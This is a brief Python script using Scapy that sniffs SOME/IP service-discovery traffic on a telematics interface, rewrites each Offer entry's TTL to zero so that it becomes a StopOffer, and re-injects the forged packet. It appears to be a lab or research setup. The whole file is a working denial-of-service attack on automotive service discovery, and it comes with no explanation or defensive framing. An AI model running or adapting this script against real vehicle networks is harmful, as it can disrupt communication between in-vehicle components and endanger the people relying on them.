from scapy.all import *
from scapy.contrib.automotive.someip import *

import pdb

#client3_mac = getmacbyip(client3_ip)
#print(f"client3_mac: {client3_mac}")

def process_packet(packet):
    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SD):
            print("someip discovery!")
            # modify Offer to StopOffer by setting ttl to zero
            packet[SOMEIP][SD][SDEntry_Service].ttl = 0
            sendp(packet, iface='telematics-eth0')

sniff(filter=f"udp and src host 10.0.0.4", iface='telematics-eth0', prn=process_packet)

